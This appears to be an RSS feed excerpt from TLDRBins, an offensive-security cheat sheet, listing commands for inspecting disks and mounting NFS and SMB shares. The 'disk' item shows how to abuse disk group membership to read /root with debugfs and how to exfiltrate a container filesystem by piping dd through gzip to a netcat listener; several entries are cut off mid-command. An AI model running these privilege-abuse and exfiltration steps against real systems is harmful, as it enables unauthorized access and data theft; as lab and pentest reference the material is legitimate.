channel.title: Mount on TLDRBins
channel.description: Recent content in Mount on TLDRBins

item.title: disk
item.description: Basic # Show devices lsblk # Device attributes blkid # Show swap on blk swapon -s # Filesystem info cat /etc/fstab Abuse disk group to read root filesystem # Open target device debugfs /dev/sda1 # Exploit ls /root Abuse disk group to read container’s filesystem # Show LVM mappings ls -l /dev/mapper/ # In our local machine nc -lvnp 4444 > dm-0.gz # Exfil filesystem (target container rootfs, e.g. dm-0) dd if=/dev/dm-0 | gzip -1 - | nc 10.

item.title: Mount Share
item.description: NFS List share showmount -e 10.10.11.10 Mount share sudo mount -t nfs 10.10.11.10:/share /mnt/share/ Others # Check all mounted drives mount # Check how shares are mounted cat /etc/exports +----------------------------------------------------------------------------------------+ |root_squash : running as root on local system will be treated as nobody user in target | |no_all_squash: every other users permission will translate from local system to target | +----------------------------------------------------------------------------------------+ SMB Mount share sudo mount -t cifs //10.10.11.10/share /mnt # With creds sudo mount -t cifs -o user=username,pass=password //10.
